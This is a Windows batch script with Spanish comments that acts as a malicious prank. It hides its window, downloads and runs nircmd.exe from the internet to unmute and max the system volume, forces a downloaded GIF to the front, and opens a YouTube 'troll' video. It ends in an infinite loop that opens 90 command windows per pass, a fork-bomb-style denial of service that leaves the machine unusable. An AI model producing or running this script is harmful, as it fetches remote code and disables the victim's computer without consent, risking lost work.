@echo off
:: Ocultar la ventana CMD
powershell -WindowStyle Hidden -Command ""

set "NIRCMD_PATH=%TEMP%\nircmd.exe"
if not exist "%NIRCMD_PATH%" (
    echo nircmd.exe no encontrado. Descargándolo...
    powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://www.nirsoft.net/utils/nircmd.zip', '%TEMP%\nircmd.zip')"
    echo Extrayendo nircmd.exe...
    powershell -Command "Expand-Archive -Path '%TEMP%\nircmd.zip' -DestinationPath '%TEMP%' -Force"
    move /Y "%TEMP%\nircmd.exe" "%NIRCMD_PATH%"
)

:: Subir volumen al máximo
"%NIRCMD_PATH%" mutesysvolume 0
"%NIRCMD_PATH%" setsysvolume 65535

:: Descargar la imagen y abrirla
set "script_dir=%~dp0"
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://media.tenor.com/mcPlflbf1p0AAAAM/monkey-deal-with-it.gif', '%script_dir%imagen.gif')"
start "" "%script_dir%imagen.gif"

:: Mantener la imagen en primer plano
powershell -Command "& {(New-Object -ComObject WScript.Shell).AppActivate('imagen.gif')}"

:: Abrir video troll en YouTube
start "" "https://www.youtube.com/watch?v=I8p89Xun5L0&ab_channel=Player2"

:: Esperar unos segundos antes de abrir los CMD
timeout /t 5 >nul

:: Bucle infinito de 90 CMD a la vez
:loop
(for /l %%i in (1,1,90) do start cmd)
goto loop

